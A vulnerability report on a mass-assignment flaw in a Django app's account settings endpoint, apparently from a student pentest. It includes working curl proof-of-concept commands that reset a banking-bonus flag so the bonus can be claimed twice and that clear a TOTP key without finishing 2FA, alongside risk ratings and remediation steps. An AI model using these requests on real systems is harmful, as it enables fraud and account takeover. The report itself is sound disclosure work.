# Description

Mass assignment (CWE-915) in the profile-update flow `POST /account/settings/` (`Account/views.py:446-461`). The `new_username` branch of `settings()` iterates over every key in `request.POST` and uses `hasattr(profile, key)` followed by `setattr(profile, key, value)` without an explicit allow-list of editable attributes (`Account/views.py:452-457`). The modified `UserProfile` instance is then saved (`Account/views.py:458`). The `csrfmiddlewaretoken` field is explicitly excluded from the assignment loop.

Note: `is_staff`, `is_superuser`, `role` and `balance` are not fields of the `UserProfile` model (`Account/models.py:13-29`). Direct modification of Django administrative privilege flags through this profile-update mechanism has not been demonstrated.

The vulnerability affects profile-level attributes, including `biography`, `picture_path` and sensitive identity, account-security and business-logic state.

The `bid` field is subject to a database-level uniqueness constraint (`Account/models.py:19-22`). A duplicate value causes an `IntegrityError` and an HTTP 500 response without changing the stored value.

Although displayed as a Banking ID in the administration interface, `bid` is not used by the application's transfer or payment logic (and is `null` for every account in the running instance).

# Exploitation

| Step | Action | Result |
|------|--------|--------|
| 1 | Authenticate as a normal user. | Valid session. |
| 2 | POST the settings form with extra fields. | The values are written straight to the profile. |
| 3 | Read the profile back. | Attacker-controlled fields persisted. |

# PoC

```bash
CSRF=$(curl -s -b jar.txt -c jar.txt https://<TARGET>/account/settings/ \
  | grep -oP 'csrfmiddlewaretoken.*?value="\K[^"]+')

curl -s -b jar.txt -c jar.txt -X POST https://<TARGET>/account/settings/ \
  -H "Referer: https://<TARGET>/account/settings/" \
  --data-urlencode "csrfmiddlewaretoken=${CSRF}" \
  --data-urlencode "new_username=<own_username>" \
  --data-urlencode "biography=mass-assigned" \
  --data-urlencode "has_claimed_bonus=False"
# 302 -> /account/settings/  (biography and has_claimed_bonus persisted)
```

**Repeated banking bonus** — claim, reset the flag via mass assignment, claim again:

```bash
curl -s -b jar.txt -c jar.txt -X POST https://<TARGET>/banking/dashboard/ \
  -H "Referer: https://<TARGET>/banking/dashboard/" \
  --data-urlencode "csrfmiddlewaretoken=${CSRF}" --data-urlencode "action=claim_bonus"
# balance 0 -> 150 NE; a second claim is refused ("already claimed")
# re-send the settings request above with has_claimed_bonus=False, then claim again:
# balance 150 -> 300 NE
```

**Clearing TOTP from a password-only session** — after logging in with only the password on an account that has `totp_key` set, `/account/` redirects to `/account/process` (TOTP pending), but `/account/settings/` has no 2FA check:

```bash
curl -s -b jar.txt -c jar.txt -X POST https://<TARGET>/account/settings/ \
  -H "Referer: https://<TARGET>/account/settings/" \
  --data-urlencode "csrfmiddlewaretoken=${CSRF}" \
  --data-urlencode "new_username=<own_username>" \
  --data-urlencode "totp_key="
# 302 -> /account/settings/ ; /account/process/ now redirects to /account/ask-2fa (TOTP removed)
```


Testing confirmed unauthorised modification of attributes belonging to the authenticated user's own profile (`biography`, `has_claimed_bonus`, `totp_key`). The database-level uniqueness constraint on `bid` prevents duplicate identifiers from being stored. Attempts to modify `is_staff` / `is_superuser` were ignored (the request returns 302, but `/admin/` still redirects to `/admin/login/`).

A financial integrity impact was confirmed in the banking bonus mechanism (`Bank/views.py:91-117`): a single account received the bonus more than once, with its balance increasing from 150 to 300 Neuros.

Insufficient protection of account-security attributes was also confirmed: `totp_key` can be set or cleared without password or TOTP confirmation, including from a session that has not yet completed TOTP verification (see PoC). Note that `GET /account/ask-2fa/no` independently clears `totp_key` from such a session, so this is not the only route to removing TOTP.

The mass assignment vulnerability was confirmed through BunkerWeb over HTTP and HTTPS with CRS 4.26 operating in detection mode.

The reverse proxy did not prevent the demonstrated unauthorised profile modifications. Application-level attribute authorisation remains necessary to protect sensitive model state.

Blocking mode was not tested.

# Risk

| Dimension | Impact |
|-----------|--------|
| Confidentiality | No direct confidentiality impact demonstrated. |
| Integrity | Unauthorised modification of profile attributes, including account-security and business-logic state. Financial integrity impact confirmed through repeated bonus allocation. Direct modification of Django administrative privilege flags was not demonstrated. |
| Availability | No direct availability impact demonstrated. |

Overall severity: **High** — unauthorised modification of sensitive profile attributes, with confirmed financial integrity impact on the banking bonus mechanism and insufficient protection of account-security settings.

# Remediation

1. **Allow-list editable fields explicitly**; never assign arbitrary `request.POST` keys to model attributes using `setattr`. Validate profile updates using a dedicated Django form with explicitly declared editable fields.
2. **Protect identity-bearing and security-sensitive fields** (`bid`, `id`, `user`, `has_claimed_bonus`, `is_activated`, `totp_key`, `email_2fa_enabled`) by excluding them from generic profile-update operations.
3. **Separate sensitive operations** behind their own audited and authorised flows. Enforce banking bonus eligibility and account-security transitions server-side, independently of user-editable profile data.
4. **Preserve database integrity constraints** and handle validation errors and `IntegrityError` exceptions appropriately instead of returning unhandled HTTP 500 responses.
5. **Add regression tests** verifying that unauthorised profile modifications are rejected, sensitive account-security state remains protected, banking bonus eligibility cannot be altered through profile updates, and database integrity constraints are preserved.

# Author
CPE LYON
